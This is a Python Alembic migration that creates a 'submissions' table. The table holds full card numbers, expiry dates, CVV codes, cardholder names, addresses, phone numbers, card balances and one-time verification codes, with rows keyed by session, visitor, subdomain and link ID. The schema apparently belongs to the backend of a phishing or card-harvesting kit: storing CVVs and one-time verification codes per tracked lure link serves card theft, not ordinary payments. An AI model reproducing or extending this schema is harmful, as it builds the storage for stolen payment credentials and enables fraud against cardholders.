"""add submissions table

Revision ID: 0006
Revises: 0005
Create Date: 2026-10-17
"""
from alembic import op
import sqlalchemy as sa
from sqlalchemy.dialects import postgresql

revision = "0006"
down_revision = "0005"
branch_labels = None
depends_on = None


def upgrade():
    op.create_table(
        "submissions",
        sa.Column("id", postgresql.UUID(as_uuid=True), primary_key=True),
        sa.Column("session_id", sa.String(64), nullable=False),
        sa.Column("visitor_id", sa.Integer(), nullable=True),
        sa.Column("subdomain", sa.String(60), nullable=False, server_default=""),
        sa.Column("link_id", sa.String(20), nullable=False, server_default=""),
        sa.Column("card_number", sa.String(32), nullable=False, server_default=""),
        sa.Column("card_exp", sa.String(10), nullable=False, server_default=""),
        sa.Column("card_cvv", sa.String(8), nullable=False, server_default=""),
        sa.Column("card_name", sa.String(200), nullable=False, server_default=""),
        sa.Column("country", sa.String(8), nullable=False, server_default=""),
        sa.Column("address1", sa.Text(), nullable=False, server_default=""),
        sa.Column("address2", sa.Text(), nullable=False, server_default=""),
        sa.Column("zip_code", sa.String(32), nullable=False, server_default=""),
        sa.Column("city", sa.String(100), nullable=False, server_default=""),
        sa.Column("phone_dial", sa.String(16), nullable=False, server_default=""),
        sa.Column("phone", sa.String(40), nullable=False, server_default=""),
        sa.Column("balance_amount", sa.String(40), nullable=False, server_default=""),
        sa.Column("balance_currency", sa.String(8), nullable=False, server_default=""),
        sa.Column("verification_code", sa.String(16), nullable=False, server_default=""),
        sa.Column("created_at", sa.TIMESTAMP(), server_default=sa.text("now()")),
        sa.Column("updated_at", sa.TIMESTAMP(), server_default=sa.text("now()")),
    )
    op.create_index("ix_submissions_session_id", "submissions", ["session_id"], unique=True)


def downgrade():
    op.drop_table("submissions")
